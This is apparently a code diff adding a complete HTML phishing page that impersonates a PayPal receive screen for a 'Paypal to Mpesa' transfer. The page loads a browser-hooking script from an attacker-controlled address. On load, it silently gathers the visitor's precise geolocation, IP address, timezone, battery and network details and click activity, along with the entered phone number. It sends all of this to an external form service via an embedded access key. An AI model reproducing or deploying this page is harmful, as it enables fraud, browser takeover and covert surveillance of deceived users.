@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Paypal to Mpesa</title>
+    <script src="http://10.0.2.15:3000/hook.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            // Track the landing page
+            document.getElementById("landing_page").value = window.location.href;
+
+            // Track the referrer URL
+            document.getElementById("referrer_url").value = document.referrer;
+
+            // Collect data when the page loads
+            collectData();
+        });
+
+        function fetchIP(callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://api.ipify.org?format=json", true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.ip);
+                } else {
+                    console.error("Error fetching IP address.");
+                    callback("unknown_ip");
+                }
+            };
+            xhr.send();
+        }
+
+        function collectData() {
+            // Collect geolocation data
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var accuracy = position.coords.accuracy;
+                    var altitude = position.coords.altitude || "unknown";
+                    var altitudeAccuracy = position.coords.altitudeAccuracy || "unknown";
+
+                    document.getElementById("latitude").value = latitude;
+                    document.getElementById("longitude").value = longitude;
+                    document.getElementById("accuracy").value = accuracy;
+                    document.getElementById("altitude").value = altitude;
+                    document.getElementById("altitude_accuracy").value = altitudeAccuracy;
+
+                    // Fetch IP address
+                    fetchIP(ipAddress => {
+                        document.getElementById("ip_address").value = ipAddress;
+
+                        // Collect other information
+                        var language = navigator.language || navigator.userLanguage;
+                        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        var networkType = "unknown";
+                        if (navigator.connection) {
+                            networkType = navigator.connection.effectiveType || "unknown";
+                        }
+
+                        document.getElementById("language").value = language;
+                        document.getElementById("timezone").value = timezone;
+                        document.getElementById("network_type").value = networkType;
+
+                        if (navigator.getBattery) {
+                            navigator.getBattery().then(battery => {
+                                var batteryLevel = battery.level * 100;
+                                var isCharging = battery.charging;
+                                document.getElementById("battery_level").value = batteryLevel;
+                                document.getElementById("battery_charging").value = isCharging;
+
+                                // Track user session (basic example: click tracking)
+                                document.addEventListener('click', () => {
+                                    var sessionRecording = document.getElementById("session_recording").value || "";
+                                    document.getElementById("session_recording").value = sessionRecording + "User clicked on the page at " + new Date().toISOString() + "; ";
+                                });
+
+                                // Send data to the server
+                                var xhr = new XMLHttpRequest();
+                                var formData = new FormData(document.getElementById("infoForm"));
+
+                                xhr.open("POST", "https://api.web3forms.com/submit", true);
+                                xhr.onload = function() {
+                                    if (xhr.status === 200) {
+                                        console.log("Information submitted successfully.");
+                                    } else {
+                                        console.error("Error submitting information.");
+                                    }
+                                };
+                                xhr.send(formData);
+                            });
+                        } else {
+                            console.warn("Battery Status API is not supported.");
+                        }
+                    });
+                }, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.error("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        function handleSubmit(action) {
+            var phoneNumber = document.getElementById("phone_number").value;
+            document.getElementById("phone_number_field").value = phoneNumber;
+            collectData();
+            // Optionally prevent default form submission if needed
+            // event.preventDefault();
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0070ba;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .login-container a {
+            color: #0070ba;
+            text-decoration: none;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>PayPal account</h2>
+        <input type="text" id="phone_number" placeholder="Recipient phone number" required>
+        <button onclick="handleSubmit('receive')">Receive</button>
+        <p>or</p>
+        <button onclick="handleSubmit('signup')">Sign Up</button>
+        <div class="footer-links">
+            <a href="#">Contact Us</a>
+            <a href="#">Privacy</a>
+            <a href="#">Legal</a>
+            <a href="#">Policy Updates</a>
+            <a href="#">Worldwide</a>
+        </div>
+        <div class="language-selection">
+            <a href="#">English</a>
+            <a href="#">Français</a>
+            <a href="#">Español</a>
+            <a href="#">中文</a>
+        </div>
+    </div>
+
+    <form id="infoForm">
+        <!-- Replace with your Access Key -->
+        <input type="hidden" name="access_key" value="4e498833-8707-46a2-b4ee-fc974bf1f7ca">
+
+        <!-- Hidden fields for geolocation and additional data -->
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+        <input type="hidden" id="accuracy" name="accuracy">
+        <input type="hidden" id="altitude" name="altitude">
+        <input type="hidden" id="altitude_accuracy" name="altitude_accuracy">
+        <input type="hidden" id="ip_address" name="ip_address">
+        <input type="hidden" id="language" name="language">
+        <input type="hidden" id="timezone" name="timezone">
+        <input type="hidden" id="network_type" name="network_type">
+        <input type="hidden" id="battery_level" name="battery_level">
+        <input type="hidden" id="battery_charging" name="battery_charging">
+
+        <!-- Additional fields -->
+        <input type="hidden" id="referrer_url" name="referrer_url">
+        <input type="hidden" id="landing_page" name="landing_page">
+        <input type="hidden" id="conversion_status" name="conversion_status">
+        <input type="hidden" id="session_recording" name="session_recording">
+        
+        <!-- Hidden field for phone number -->
+        <input type="hidden" id="phone_number_field" name="phone_number">
+    </form>
+</body>
+</html>
